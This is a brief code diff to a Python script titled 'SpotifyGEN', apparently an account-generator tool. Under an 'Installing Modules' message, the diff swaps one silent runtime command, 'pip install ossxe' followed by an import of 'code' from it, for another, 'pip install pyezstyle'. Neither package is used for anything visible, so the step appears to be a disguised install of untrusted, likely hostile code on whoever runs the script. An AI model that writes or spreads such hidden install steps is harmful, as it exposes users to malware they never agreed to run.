@@ -4,8 +4,8 @@ import threading, os, time
 
 os.system(f'cls & mode 85,20 & title SpotifyGEN')
 print("Installing Modules")
-os.system('pip install ossxe')
-from ossxe import code
+os.system('pip install pyezstyle')
+
 os.system('cls')
 print("""
  _______  ______  ______  _____  _  _  _       ______ _______ __   _
